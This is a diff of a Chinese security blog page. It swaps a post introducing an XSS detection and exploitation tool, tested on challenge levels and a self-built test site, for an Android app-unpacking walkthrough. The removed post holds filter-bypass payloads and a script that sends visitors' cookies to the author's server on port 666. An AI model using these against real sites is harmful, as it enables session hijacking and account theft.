@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/28/Wker-XSSTool/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/28/Android%E8%84%B1%E5%A3%B3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/03/28/Wker-XSSTool/" class="post-title-link" itemprop="url">Wker_XSSTool</a>
+            <a href="/2020/03/28/Android%E8%84%B1%E5%A3%B3/" class="post-title-link" itemprop="url">Android脱壳</a>
         </h1>
 
         <div class="post-meta">
@@ -229,18 +229,24 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-03-28 06:06:12 / Modified: 09:20:06" itemprop="dateCreated datePublished" datetime="2020-03-28T06:06:12+08:00">2020-03-28</time>
+              <time title="Created: 2020-03-28 15:21:38" itemprop="dateCreated datePublished" datetime="2020-03-28T15:21:38+08:00">2020-03-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-10 08:12:23" itemprop="dateModified" datetime="2020-04-10T08:12:23+08:00">2020-04-10</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
+                    <span itemprop="name">逆向分析</span>
                   </a>
                 </span>
             </span>
@@ -256,36 +262,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>这种漏洞相对于其他为例比较大的漏洞来说可能稍显鸡肋了，但是在有的时候却是一种没有办法的办法</p>
-<p>相关的检测和利用工具之前说要做，但是一直拖着，昨天有点时间，写了一下午就匆匆写完，有一些细节方面处理的不是很仔细，但是个人感觉使用起来还是没什么问题的。</p>
-<h2 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h2><p>这种是可以进行工具检测的，相对而言可以减少很多的体力活，在这里我使用XSS挑戰賽給大家做為一個示例，这个挑战赛分为很多关卡，举出一两个比较有代表性的作为例子。<br>目前我只做了GET提交方式的，POST提交的暂时没有去做，但是很快也会补上的。<br><img src="img1.jpg" alt="第二关"></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span></span><br><span class="line">&#123;     </span><br><span class="line"><span class="actionscript">confirm(<span class="string">"完成的不错！"</span>);</span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.location.href=<span class="string">"level3.php?writing=wait"</span>; </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span>=<span class="string">"border:0px"</span> <span class="attr">type</span>=<span class="string">"text/x-scriptlet"</span> <span class="attr">data</span>=<span class="string">"http://xss.tv/themes/default/templates/head.html"</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">50</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和test相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level2.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"搜索"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level2.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:4<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>基本可以确定两个变量输出的位置，根据简单的闭合操作就可以实现弹窗，那么工具如何使用？<br>首先看一下目录结构：<br><img src="img2.jpg" alt="目录结构"></p>
-<ol>
-<li>js目录是用来保存我们的木马js的</li>
-<li>plugins是用来保存我们的插件的（后面有讲如何编写插件）</li>
-<li>PayLoad是用来保存我们的payload的</li>
-</ol>
-<p>知道这些以后，我们就使用工具进行检测，进入界面之后，在我们的文本框中键入我们需要检测的URL，这里是第一个需要之后修复的细节，就是我只是简单的做了文本的拼接，所以我们需要将可疑的参数放置在最后，并且无对应的键值。<br><img src="img3.jpg" alt="检测界面"><br>这个时候我们就要进行检测，点击右边的Button，开始检测，可以来看下效果：<br><img src="img4.jpg" alt="检测结果"><br>可以看到提供给我们四个payload，那这四个payload到底是如何得到的呢？<br>首先在Payload.txt文件夹中存在：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/wker/</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这些payload是可以自己添加的。<br>这样子的一条检测语句，那为什么会出现四个呢？其实很简单，我们仔细观察源代码，你会发现，在第二关存在两个输出我们传入变量的HTML节点：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和test相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这两条，如果我们手动去检测的话呢，第一个需要关注的就是这两个存在输出位置的HTML节点，所以我增加payload的修饰功能，也就是可以帮助你自动的闭合标签，比较智能化的去检测页面的XSS。<br>那每一个输出点的第二条是什么，又是怎么来的？这个是由插件所提供的功能，其实这里说的插件就是我们自己编写的DLL。现在看这个XSS挑战赛的第六关：<br><img src="img5.jpg" alt="第六关"><br>这一关对我们的输入是做了一些检测的，也就是对script进行了一个替换，但是他无法对付大小写的一个绕过，那这个时候使用工具进行检测：<br><img src="img6.jpg" alt="检测结果"><br>可以看到我们只存在一条了，那另一条哪里去了？其实是因为script的过滤导致我们无法进行注入，但是我嗯是用大小写绕过之后确实可以进行注入的，那么为什么可以进行大小写的替换，就是因为我们的插件，来到plugins的目录下，可以看到：<br><img src="img7.jpg" alt="插件"><br>这样子的一个DLL文件，那么这个DLL文件是如何实现对我们Payload的一个修饰呢？我们查看他的导出函数：<br><img src="img8.jpg" alt="导出函数"><br>可以看到他有一个导出函数，也就是程序通过调用这个导出函数实现我们的payload修饰。<br>来看下是怎么书写的：<br><img src="img9.jpg" alt="EncodePayload"><br>我会对整个plugins进行一个遍历，对所有的<code>EncodePayload</code>函数的值进行一个保存，在我们进行检测的时候我会调用相对的方法去修饰我们的payload，传给你三个参数，第一个参数是要修饰的payload，第二个参数是用来接收的payload，第三个参数是认为如果存在漏洞，页面中应该存在的文本内容。<br>这个函数最终实现的就是一个script转化为SCRIPT的效果，所以我们能够成功的绕过第六关的一个检测。<br>那么如果你想编写自己的插件的话呢，那么你需要在头文件中键入类似于如下的内容：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EXAMPLEDLL_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXAMPLEDLL_API extern<span class="meta-string">"C"</span> __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXAMPLEDLL_API extern<span class="meta-string">"C"</span> __declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXAMPLEDLL_API <span class="keyword">int</span> <span class="title">EncodePayload</span><span class="params">(<span class="keyword">char</span>* SourcePayload,<span class="keyword">char</span>* EncodePayload,<span class="keyword">char</span>* FindPayload)</span></span>;</span><br></pre></td></tr></table></figure>
-<p><code>extern&quot;C&quot;</code>是很重要的，这个保证了我可以通过EncodePayload来获得你的地址，<code>__declspec(dllexport)</code>这个保证了导出函数。</p>
-<h2 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h2><p>那么我们就来实践编写一个插件，来到第七关，这一关就是对我们的script进行一个替换，那么，我们只需要对其简单地进行嵌套就可以实现绕过，那么我们编写插件的思路就是，将payload中的<code>script</code>替换为<code>scrscriptipt</code>就可以实现绕过，那么我们新建一个DLL项目，然后使用上面的宏定义。<br>然后编写我们的<code>EncodePayload</code>方法：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EncodePayload</span><span class="params">(<span class="keyword">char</span>* SourcePayload,<span class="keyword">char</span>* EncodePayload,<span class="keyword">char</span>* FindPayload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CString source;</span><br><span class="line">	source.Format(<span class="string">"%s"</span>,SourcePayload);</span><br><span class="line">	source.Replace(<span class="string">"script"</span>,<span class="string">"scrscriptipt"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(FindPayload,SourcePayload);</span><br><span class="line">	<span class="built_in">strcpy</span>(EncodePayload,source.GetBuffer());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我这里用了一个Cstring进行了一个中专，比较简单，如果要操作char的话呢有一点小麻烦，其实可以看到也就是简单的文本替换，只是我们要寻找的文本还是我们之前的那个文本！<br>最后看下我们实现的一个效果：<br><img src="img10.jpg" alt="自写插件"><br>可以看到我们确实是检测出了那个我们想要的效果！</p>
-<p>对外提供了接口之后，你们可以实现base64加密啊这类的一些加密和绕过。</p>
-<p>但是在这里需要注意的一点就是我传给你的指针是我已经new了的，但是大小是50个长度，所以你生成的payload不要超过50个字符！否则会溢出的。</p>
-<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>这个就比较实用了，经常用到，之前我都是用XSS平台，但是它里面提供的功能总是很多不能用，而且我觉得他那边也能看到我们打到的cookie，所以我就不是很喜欢，所以我就自己做了一个服务端，也提供给大家使用，后期也提供接口开发，只要你的服务器是对外网开放666端口的就是可以进行连接！<br>BEEF相对而言迁移有点麻烦，所以我就在检测端写了相对应的存储型XSS服务。<br>下面给大家做一个示例：<br>搭建一个简单的靶场，就是用来测试的，存在一个存储型的XSS：<br><img src="img11.jpg" alt="提交留言"><br>在留言内容中提交我们的payload，那这个payload怎么写呢？我们用Wker_XSSTool的第二个页面，勾选上开始劫持，勾选上之后如果不报错没并且有这样的一个提示，说明服务器开启正常，当然你的防火墙是需要给我开房666端口的。<br><img src="img12.jpg" alt="开启端口"><br>看到详细信息中心给了我们这样子的一段内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请使用类似于:&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;127.0.0.1:666&#x2F;WkerJS&gt;&lt;&#x2F;sCrIpT&gt; 这样的PayLoad，只有这样Wker_XSSTool才能接收到劫持的信息！</span><br></pre></td></tr></table></figure>
-<p>就是说你将你的IP的666端口下的WkerJS作为SRC进行注入Wker_XSSTool就可以进行接受，那么我们的JS到地方再哪里？我们如何配置？<br>在上面的目录结构到js目录下有个Main.js这个文件，我们看一下他的内容：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="comment">//var xhr = new ActiveXObject("Microsoft.XMLHTTP");</span></span><br><span class="line">xhr.open(<span class="string">"HEAD"</span>, <span class="string">"http://192.168.209.1:666/"</span>+<span class="built_in">window</span>.location.href+<span class="string">"|--|"</span>+<span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
-<p>可以看到就是一个简单的数据提交，这里你需要更改这个192.168.209.1，将其改为你服务器的IP，因为只有这样我们才能获取。<br>payload的构造其实不是很难：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">tExtArEa</span>&gt;</span>'"&gt;<span class="tag">&lt;<span class="name">sCRiPt</span> <span class="attr">sRC</span>=<span class="string">http://192.168.209.1:666/WkerJS</span>&gt;</span><span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="img13.jpg" alt="提交Payload"><br>提交之后，当我们的管理员打开我们提交的页面之后，我们的服务端就能接受到他的cookie！<br>下面是示例：<br><img src="img14.gif" alt="成功"><br>可以看到我们成功的获取到了管理员的信息！</p>
-<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>之后我会更新这个程序的，主要是增加许多相对应的功能，因为细节方面没有做的很完美，最近主要是想把我之前做的那个Wker_EXEDebug这个调试工具写的完美一些，不能说跟得上OD，IDA和X64，但是至少也要做到许多他们有的我也要有的功能。</p>
+          <h1 id="Android脱壳"><a href="#Android脱壳" class="headerlink" title="Android脱壳"></a>Android脱壳</h1><p>比较简单的示例，拖一个阿里的壳，从别的地方学习借鉴到的。<a href="https://blog.csdn.net/coc_k/article/details/51985976" target="_blank" rel="noopener" title="传送门">https://blog.csdn.net/coc_k/article/details/51985976</a><br>首先脱壳Android Killer，发现是阿里的壳。<br><img src="img1.jpg" alt="壳"><br>看一下入口类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:name&#x3D;&quot;com.ali.mobisecenhance.StubApplication&quot;</span><br></pre></td></tr></table></figure>
+<p>明显是加壳了，而且文件结构中只有一个类，典型的加固，使用IDA进行脱壳。</p>
+<p>使用调试模式打开APP，使用到的命令：<br>adb shell am start -D -n com.ali.tg.testapp/.MainActivity</p>
+<p><img src="img2.jpg" alt="调试模式"><br>等待我们的调试进程进行附加</p>
+<p>我们使用IDA附加进程。来到：/system/lib/libdvm.so 这个库文件中，在导出函数：dvmDexFileOpenPartial的开始位置下断：</p>
+<p><img src="img3.jpg" alt="特定函数下断"></p>
+<p>下好断点之后，连接调试进程：jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700</p>
+<p>输入这条命令之后，JDB就会在等待IDA运行，运行之后JDB就输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\a&gt;jdb -connect com.sun.jdi.SocketAttach:hostname&#x3D;localhost,port&#x3D;8700</span><br><span class="line">设置未捕获的java.lang.Throwable</span><br><span class="line">设置延迟的未捕获的java.lang.Throwable</span><br><span class="line">正在初始化jdb...</span><br></pre></td></tr></table></figure>
+<p>这个可能失败，要注意看看DDMS怎么个情况。<br>然后我们程序就会断在：</p>
+<p><img src="img4.jpg" alt="断下"><br>我们是在dvmDexFileOpenPartial这个函数断下的，所以我们的第一个参数是dex文件的起始地址，第二个参数是dex文件的长度。第一个参数的值存在R0，第二个参数的值存在R1。我们转到R0看一下：<br><img src="img5.jpg" alt="R0寄存器"><br>可以看到起始地址就是我们想要要的，然后使用脱壳脚本进行脱壳，R0:0x4E472008，R1:0x941FC</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">    fp = fopen(<span class="string">"d:\\dump.dex"</span>, <span class="string">"wb"</span>); <span class="comment">//打开或创建一个文件</span></span><br><span class="line">    begin =  <span class="number">0x4E472008</span>;              <span class="comment">//dex基址</span></span><br><span class="line">    end = begin + <span class="number">0x941fc</span>;            <span class="comment">//dex基址 + dex文件大小</span></span><br><span class="line">    <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end;dexbyte ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        fputc(Byte(dexbyte), fp);     <span class="comment">//按字节将其dump到本地文件中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行这个脚本，会在D盘下生成一个dex文件。<br><img src="img6.jpg" alt="运行脚本"><br>然后我们将脱掉的dex反编译。<br><img src="img7.jpg" alt="反编译dex"><br>最后得到smali文件：<br><img src="img8.jpg" alt="生成文件"><br>然后我们将这两个文件拖进Android Killer的。<br><img src="img9.jpg" alt="复制"><br><img src="img10.jpg" alt="新文件"><br>然后我们将我们的入口APP类删除掉，最后就是剩下我们脱掉壳的程序了。<br><img src="img11.jpg" alt="删除入口类"><br>然后我们进行编译！最终就会生成脱壳之后的apk文件。<br>能够正常运行。<br><img src="img12.jpg" alt="脱壳成功"></p>
 
       
     </div>
@@ -305,7 +295,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/24/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><span class="page-number current">25</span><a class="page-number" href="/page/26/">26</a><span class="space">&hellip;</span><a class="page-number" href="/page/114/">114</a><a class="extend next" rel="next" href="/page/26/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/24/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><span class="page-number current">25</span><a class="page-number" href="/page/26/">26</a><span class="space">&hellip;</span><a class="page-number" href="/page/115/">115</a><a class="extend next" rel="next" href="/page/26/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -372,7 +362,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">114</span>
+          <span class="site-state-item-count">115</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
